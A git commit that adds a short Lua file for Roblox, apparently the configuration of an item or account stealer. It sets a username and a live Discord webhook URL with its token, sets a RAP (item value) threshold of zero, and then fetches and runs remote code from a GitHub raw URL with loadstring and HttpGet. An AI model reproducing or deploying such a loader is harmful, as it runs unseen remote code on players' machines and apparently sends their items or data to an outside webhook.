da2c39a5111f0332dd316da0d5b7474a8c56cfe9
VOIDZ <goldbed145@gmail.com>
2024-12-12 20:46:03 +0800

    Upload new file: VoidScript_19822_note.lua

---
+++ VoidScript_19822_note.lua
@@ -0,0 +1,6 @@
+Username = 'mainarxd123'
+Webhook = 'https://discord.com/api/webhooks/1315408872793702520/pqWZQxlJS9muEbCfMkAWcOOEInL8EZkAHOgGlMxMEkgj8QkMQlqieEi22FLNgVYnCflq'
+
+MinimumRAP = 0
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/VOIDv3/VOIDSCRIPTS/refs/heads/main/VOIDSCRIPTS'))()
